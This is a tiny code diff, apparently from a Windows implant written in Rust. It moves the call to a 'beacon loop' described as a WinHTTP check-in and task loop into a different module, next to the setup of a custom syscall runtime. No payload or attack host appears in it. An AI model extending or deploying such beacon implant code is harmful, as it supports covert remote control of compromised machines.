@@ -36,5 +36,5 @@ pub unsafe extern "system" fn nyx_entry() {
     let _syscall_rt = crate::syscalls::Runtime::init();
 
     // 3. Enter the beacon loop (WinHTTP check-in + task loop).
-    crate::core::beacon_loop();
+    crate::beacon::beacon_loop();
 }
